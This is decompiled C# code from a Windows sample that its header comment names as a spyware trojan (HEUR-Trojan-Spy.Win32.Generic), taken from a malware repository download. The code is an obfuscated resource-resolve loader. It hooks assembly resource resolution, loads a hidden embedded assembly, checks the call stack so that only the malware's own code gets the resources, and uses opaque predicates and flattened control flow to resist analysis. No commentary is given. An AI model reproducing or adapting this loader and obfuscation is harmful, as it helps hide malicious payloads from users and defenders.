// Decompiled with JetBrains decompiler
// Type: .
// Assembly: qouzb, Version=0.0.0.0, Culture=neutral, PublicKeyToken=34256fcd934ca661
// MVID: 528C9DDA-94F5-4688-B6FB-056FFA07C362
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.Win32.Generic-6c64cd522d7e6f3c0b6f0116271cde81e35213ad4a360fe569f48f99fd473e62.exe

using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0001
{
  internal class \u0001
  {
    private static Assembly \u0001;
    private static string[] \u0001;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0001()
    {
      try
      {
        try
        {
          AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u0001.\u0001.\u0001);
        }
        catch (Exception ex)
        {
        }
      }
      catch (Exception ex)
      {
        \u0023\u0023.\u00236i(ex);
        throw;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static Assembly \u0001([In] object obj0, [In] ResolveEventArgs obj1)
    {
      string[] strArray1;
      string name;
      int index;
      try
      {
        if ((object) \u0001.\u0001.\u0001 == null)
        {
          Monitor.Enter((object) (strArray1 = \u0001.\u0001.\u0001));
          try
          {
            \u0001.\u0001.\u0001 = Assembly.Load("{3d88ce44-8608-4965-98c4-efa13cb786bb}, PublicKeyToken=3e56350693f7355e");
            int num = 2;
            while (true)
            {
              switch (num)
              {
                case 0:
                case 2:
                  goto label_3;
                case 1:
                case 3:
                  goto label_6;
                default:
                  if (\u0001.\u0001.jZAakxKK3jgok4lmKls())
                  {
                    num = 3;
                    continue;
                  }
                  goto label_6;
              }
            }
label_3:
            if ((object) \u0001.\u0001.\u0001 == null)
              goto label_8;
label_6:
            \u0001.\u0001.\u0001 = \u0001.\u0001.\u0001.GetManifestResourceNames();
          }
          finally
          {
            Monitor.Exit((object) strArray1);
          }
        }
label_8:
        name = obj1.Name;
        for (index = 0; index < \u0001.\u0001.\u0001.Length; ++index)
        {
          if (\u0001.\u0001.\u0001[index] == name)
            return !\u0001.\u0001.\u0001() ? (Assembly) null : \u0001.\u0001.\u0001;
        }
        return (Assembly) null;
      }
      catch (Exception ex)
      {
        string str = name;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) index;
        string[] strArray2 = strArray1;
        object obj = obj0;
        ResolveEventArgs resolveEventArgs = obj1;
        \u0023\u0023.\u0023mk(ex, (object) str, (object) local, (object) strArray2, obj, (object) resolveEventArgs);
        throw;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool \u0001()
    {
      StackFrame[] frames;
      int index;
      StackFrame stackFrame1;
      try
      {
        bool flag;
        try
        {
          frames = new StackTrace().GetFrames();
          for (index = 2; index < frames.Length; ++index)
          {
            stackFrame1 = frames[index];
            if ((object) stackFrame1.GetMethod().Module.Assembly == (object) Assembly.GetExecutingAssembly())
            {
              flag = true;
              goto label_7;
            }
          }
          flag = false;
        }
        catch
        {
          flag = true;
        }
label_7:
        return flag;
      }
      catch (Exception ex)
      {
        StackFrame[] stackFrameArray = frames;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) index;
        StackFrame stackFrame2 = stackFrame1;
        bool flag;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local2 = (ValueType) flag;
        \u0023\u0023.\u0023pl(ex, (object) stackFrameArray, (object) local1, (object) stackFrame2, (object) local2);
        throw;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0001()
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    static \u0001()
    {
      try
      {
        \u0001.\u0001.\u0001 = (Assembly) null;
        \u0001.\u0001.\u0001 = new string[0];
      }
      catch (Exception ex)
      {
        \u0023\u0023.\u00236i(ex);
        throw;
      }
    }

    internal static bool jZAakxKK3jgok4lmKls() => true;

    internal static bool SVRvZ5K53hxkvUmtffD() => false;
  }
}
